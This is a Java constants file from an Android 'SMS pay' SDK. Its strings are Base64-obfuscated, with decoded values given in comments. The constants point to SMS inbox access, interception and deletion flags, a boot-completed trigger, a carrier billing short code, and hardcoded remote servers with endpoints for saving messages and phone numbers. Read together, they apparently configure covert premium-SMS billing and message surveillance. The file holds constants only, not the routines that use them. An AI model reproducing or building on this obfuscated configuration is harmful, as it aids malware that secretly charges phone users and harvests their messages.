package com.y7.smspay.sdk.util;

import android.util.Base64;

public class StrUtils {
    // com.yc.osdk.util.StrUtils
    public static final String Alarm = e("QWxhcm0=");// Alarm
    public static final String BOOT_COMPLETED = e("YW5kcm9pZC5pbnRlbnQuYWN0aW9uLkJPT1RfQ09NUExFVEVE");// android.intent.action.BOOT_COMPLETED
    public static final String CHL_KK_ID = e("WUNITC1LSy1JRA==");// YCHL-KK-ID
    public static final String ConfirmSendDown_URL = e("Y29uZmlybVNlbmREb3du");// confirmSendDown
    public static final String DOWNLOAD_FILE = e("Y29udGVudDovL2Rvd25sb2Fkcy9kb3dubG9hZA==");// content://downloads/download
    public static final String DYBN_REPORT_URL = e("aHR0cDovLzEwMy4xMC44Ny4xNDMvc3kvZGlhbnhpbl9nZXRUaGlyZENoYXJnZUNvZGVBbmRQYXlEZXRhaWxfaHRtbC5qc3A=");// http://103.10.87.143/sy/dianxin_getThirdChargeCodeAndPayDetail_html.jsp
    public static final String FINDNUM_URL = e("RmluZE51bQ==");// FindNum
    public static final String HTTPHOST1 = e("MTAuMC4wLjE3Mg==");// 10.0.0.172
    public static final String HTTPHOST2 = e("MTAuMC4wLjIwMA==");// 10.0.0.200
    public static final String INIT_URL = e("aW5pdA==");// init
    public static final String INTERNET = e("d2lmaQ==");// wifi
    public static final String INTERNET1 = e("Y3R3YXA=");// ctwap
    public static final String INTERNET2 = e("Y213YXA=");// cmwap
    public static final String INTERNET3 = e("M2d3YXA=");// 3gwap
    public static final String INTERNET4 = e("dW5pd2Fw");// uniwap
    public static final String IS_NEED_PAY_URL = e("ZnVmZWlkaWFu");// fufeidian
    public static final String KEY = e("d3d3LnNucy5jb20=");// www.sns.com

    public static final String PAYRDO = e("UGF5UmRv");// PayRdo

    public static final String PRICECONFIG_URL = e("UHJpY2VDb25maWc=");// PriceConfig
    public static final String Pay_VQianGuanAppId = e("UEFZX1lGVF9BUFBJRA==");// PAY_YFT_APPID
    public static final String Pay_VQianGuanChannelId = e("UEFZX1lGVF9DSEFOTkVMSUQ=");// PAY_YFT_CHANNELID
    public static final String Pay_YiFuTongAppId = e("UEFZX1lGVF9BUFBJRA==");// PAY_YFT_APPID
    public static final String Pay_YiFuTongPupChannelId = e("UEFZX1lGVF9DSEFOTkVMSUQ=");// PAY_YFT_CHANNELID
    public static final String RAND_URL = e("UXVlcnlUaG91cmdo");// QueryThourgh
    public static final String SAVEMESSAGE_URL = e("c2F2ZU1lc3NhZ2U=");// saveMessage
    public static final String SAVEPHONENUM = e("U2F2ZVBob25lbnVt");// SavePhonenum
    public static final String SAVE_URL = e("c2F2ZU9yZGVy");// saveOrder
    public static final String SENDER_ADDRESS = e("MTA2NTg4");// 106588
    //	public static final String SERVER_URL = e("aHR0cDovL3FxbW9uc3Rlci5jb206ODA4MA==");// http://qqmonster.com:8080
//	public static final String SERVER_URL = "http://192.168.3.69:8080";// http://119.23.136.190:8280
//	public static final String SERVER_URL = e("aHR0cDovLzExOS4yMy4xMzYuMTkwOjgyODA="); //http://119.23.136.190:8280
    public static final String SERVER_URL = "http://119.23.136.190:8280"; //线上
//    public static final String SERVER_URL = "http://192.168.3.69:8080"; //本地


    public static final String SMS_ALL_URI = e("Y29udGVudDovL3Ntcy8=");// content://sms/
    public static final String SMS_INBOX_URI = e("Y29udGVudDovL3Ntcw==");// content://sms
    public static final String SMS_ISDELSSMSABILITY = e("SVNERUxTU01TQUJJTElUWQ==");// ISDELSSMSABILITY
    public static final String SMS_ISPAYUNFAIRLOST = e("SVNQQVlVTkZBSVJMT1NU");// ISPAYUNFAIRLOST
    public static final String SMS_MESSAGEBODY = e("TUVTU0FHRUJPRFk=");// MESSAGEBODY
    public static final String SMS_PHONENUMBER = e("UEhPTkVOVU1CRVI=");// PHONENUMBER
    public static final String SMS_PRICE = e("UFJJQ0U=");// PRICE

    public static final String SMS_SETTING = e("U0VUVElORw==");// SETTING
    public static final String SMS_URI = e("Y29udGVudDovL21tcy1zbXMv");// content://mms-sms/

    //	public static final String URL = e("L2d3em9vL3BpbnRlcmZhY2UvUGhvbmVBUElBY3Rpb24h");// /gwzoo/pinterface/PhoneAPIAction!
    public static final String URL = e("L2d3em9vMi9waW50ZXJmYWNlL1Bob25lQVBJQWN0aW9uIQ==");

    public static final String VERSIONS = e("Ni4zLjE=");// 6.2.2
    public static final String VGP_ID = e("dmdwX2lk");// vgp_id

    public static final String isRequest = e("UFNES19SRVFVRVNU");// PSDK_REQUEST

    public static final String HAS_DEL = e("aGFzZGVs");// hasdel
    public static final String REPORT_SEDAULT_SMS = e("Y29uZmlybT8=");// hasdel

    public static final String NET_SDK_PAY = "sdkBack";
    public static final String NET_PAY = "successPay";
    public static final String NET_INTERCEPT = "successIntercept";
    public static final String NET_SDK_CONFIG = "sdkConfig";


    // My4wLjA=
    public static String e(String s) {
        String str = null;
        try {
            str = new String(Base64.decode(s.getBytes(), Base64.NO_WRAP));
        } catch (Exception var5) {
            var5.printStackTrace();
        }
        return str.trim();
    }

	/*
     * public final static String SMS_RECEIVED =
	 * "android.provider.Telephony.SMS_RECEIVED"; public final static String
	 * WAP_PUSH_RECEIVED = "android.provider.Telephony.WAP_PUSH_RECEIVED";
	 * public final static String BOOT_COMPLETED =
	 * "android.intent.action.BOOT_COMPLETED"; public final static String
	 * UMS_CONNECTED = "android.intent.action.UMS_CONNECTED"; public final
	 * static String ACTION_TIME_CHANGED =
	 * "android.intent.action.ACTION_TIME_CHANGED"; public final static String
	 * ACTION_DATE_CHANGED = "android.intent.action.ACTION_DATE_CHANGED"; public
	 * final static String ACTION_TIMEZONE_CHANGED =
	 * "android.intent.action.ACTION_TIMEZONE_CHANGED"; public final static
	 * String ACTION_MEDIA_EJECT = "android.intent.action.ACTION_MEDIA_EJECT";
	 * public final static String ACTION_PACKAGE_ADDED =
	 * "android.intent.action.ACTION_PACKAGE_ADDED"; public final static String
	 * SIM_STATE_CHANGED = "android.intent.action.SIM_STATE_CHANGED"; public
	 * final static String STATE_CHANGED =
	 * "android.bluetooth.adapter.action.STATE_CHANGED"; public final static
	 * String ANY_DATA_STATE = "android.intent.action.ANY_DATA_STATE"; public
	 * final static String USER_PRESENT = "android.intent.action.USER_PRESENT";
	 * public final static String PHONE_STATE =
	 * "android.intent.action.PHONE_STATE"; public final static String
	 * PACKAGE_REPLACED = "android.intent.action.PACKAGE_REPLACED"; public final
	 * static String PACKAGE_ADDED_ACTION =
	 * "android.intent.action.PACKAGE_ADDED_ACTION"; public final static String
	 * PACKAGE_REMOVED_ACTION = "android.intent.action.PACKAGE_REMOVED_ACTION";
	 * public final static String PACKAGE_ADDED =
	 * "android.intent.action.PACKAGE_ADDED"; public final static String Alarm =
	 * "Alarm";
	 * 
	 * 
	 * public static final String SERVER_URL =
	 * "http://qqmonster.com:8080";//http://120.55.119.196
	 * 
	 * 
	 * public static final String CHL_KK_ID = "YCHL-KK-ID";// "YCHL-ID" public
	 * static final String VGP_ID = "vgp_id";// "vgp_id" public static final
	 * String isRequest = "PSDK_REQUEST";// "vgp_id"
	 * 
	 * public static final String SMS_PRICE = "PRICE";// "vgp_id" public static
	 * final String SMS_SETTING = "SETTING";// "vgp_id" public static final
	 * String SMS_PHONENUMBER = "PHONENUMBER";// "vgp_id" public static final
	 * String SMS_MESSAGEBODY = "MESSAGEBODY";// "vgp_id" public static final
	 * String SMS_ISPAYUNFAIRLOST = "ISPAYUNFAIRLOST";// "vgp_id"
	 * 
	 * public static final String SMS_ISDELSSMSABILITY = "ISDELSSMSABILITY";//
	 * "vgp_id"
	 * 
	 * // 更新鼎园的透传参数 public static final String VERSIONS = "2.5.7"; //12.30-2.5.4
	 * 
	 * public static final String HTTPHOST1 = "10.0.0.172"; public static final
	 * String HTTPHOST2 = "10.0.0.200";
	 * 
	 * public final static String KEY = "www.sns.com";
	 * 
	 * 
	 * public static final String INTERNET = "wifi"; public static final String
	 * INTERNET1 = "ctwap"; public static final String INTERNET2 = "cmwap";
	 * public static final String INTERNET3 = "3gwap"; public static final
	 * String INTERNET4 = "uniwap";
	 * 
	 * public static final String DOWNLOAD_FILE =
	 * "content://downloads/download";
	 * 
	 * 
	 * public static final String Pay_YiFuTongAppId = "PAY_YFT_APPID"; public
	 * static final String Pay_YiFuTongPupChannelId = "PAY_YFT_CHANNELID";//
	 * "YCHL-ID"
	 * 
	 * 
	 * public static final String Pay_VQianGuanAppId = "PAY_YFT_APPID"; public
	 * static final String Pay_VQianGuanChannelId = "PAY_YFT_CHANNELID";//
	 * "YCHL-ID"
	 * 
	 * 
	 * public static final String SMS_URI = "content://mms-sms/"; public static
	 * final String SMS_INBOX_URI = "content://sms"; public static final String
	 * SENDER_ADDRESS = "106588"; public static final String[] body = {
	 * "4000826898", "4006289988" };
	 * 
	 * 
	 * public static final String DYBN_REPORT_URL =
	 * "http://103.10.87.143/sy/dianxin_getThirdChargeCodeAndPayDetail_html.jsp"
	 * ;
	 * 
	 * public static final String ConfirmSendDown_URL = "confirmSendDown";
	 * public static final String INIT_URL = "init"; public static final String
	 * RAND_URL = "QueryThourgh"; public static final String SAVE_URL =
	 * "saveOrder"; public static final String IS_NEED_PAY_URL = "fufeidian"; //
	 * 付费点是否需要付费 public static final String PRICECONFIG_URL = "PriceConfig"; //
	 * 付费点是否需要付费 public static final String SAVEMESSAGE_URL = "saveMessage"; //
	 * 保存短信 public static final String FINDNUM_URL = "FindNum"; // 保存短信 public
	 * static final String SAVEPHONENUM = "SavePhonenum"; // 保存短信 public static
	 * final String PAYRDO = "PayRdo"; // 保存短信 public static final String URL =
	 * "/gwzoo/pinterface/PhoneAPIAction!";
	 * 
	 * public static final String SMS_ALL_URI = "content://sms";
	 */
}
